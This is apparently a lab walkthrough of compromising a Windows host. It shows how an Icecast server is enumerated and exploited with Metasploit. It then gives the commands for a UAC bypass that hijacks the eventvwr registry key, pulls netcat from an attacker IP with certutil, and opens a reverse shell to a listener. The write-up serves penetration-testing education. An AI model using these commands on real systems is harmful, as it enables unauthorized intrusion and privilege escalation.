

**OS:** Windows  
**Date:** 24th of September 2026 

## Enumeration
Our initial scans yields these open ports at the target host:


We see several services running on port:

![](Images/Pasted%20image%2020260924090141.png)
  
We attempt to connect to smb and rpc. rpc does not let us do anything. We are able to authenticate with anonymous over smb, but no shares available over smb. The guest account is disabled.
We see that there is something which looks like a web server and going to that page we see an error message. We check the GET request with Burpsuite and see that the status code running seems to be 404 and that the resource it is running does not exists:

![](Images/Pasted%20image%2020260924090502.png)

We attempt to fingerprint this service:

![](Images/Pasted%20image%2020260924090559.png)

We see that it is an Icecast streaming media server. Let's check if Icecast has a known exploit with Metasploit:

![](Images/Pasted%20image%2020260924090653.png)

## Exploitation
It does. Now let's attempt it. We see which options are available and as expected we need port and ip-address.

![](Images/Pasted%20image%2020260924090747.png)

We set the rhost and rport and attempt to send the payload and we get a connection over meterpreter:

![](Images/Pasted%20image%2020260924090847.png)

Now that we are on the machine, we want to check what privileges we have.

![](Images/Pasted%20image%2020260924091652.png)

We are an administrator, but we have the medium mandatory label as well, which means that we want to escalate privileges to get admin rights.

## Post-Exploitation (Privilege Escalation)
There is a way to escalate privileges through either eventvwr.exe or Fodhelper.exe if they are present on the target. Let's check if they are:

![](Images/Pasted%20image%2020260924114538.png)

And for Eventviewer, it is present so we can attempt it. On the victim we run:

```
REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command
```
and 
```
REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ
```

We then onload netcat executable onto the machine, serving it over http and then running
```
certutil.exe -urlcache -split -f http://ATTACKER-IP/nc64.exe
```


![](Images/Pasted%20image%2020260924114706.png)

We then run:
```
REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "c:\windows\tasks\nc64.exe -nv 192.168.148.97 443 -e cmd.exe" /f
```
We then set up the listener with
```
rlwrap nc -lvnp 443
```

And we can then start the compromised eventviewer:

![](Images/Pasted%20image%2020260924121036.png)

And we spawned a shell with a process with administrative privileges.
We attempt to do write privileges in a protected are:

![](Images/Pasted%20image%2020260924121303.png)

Which works beautifully.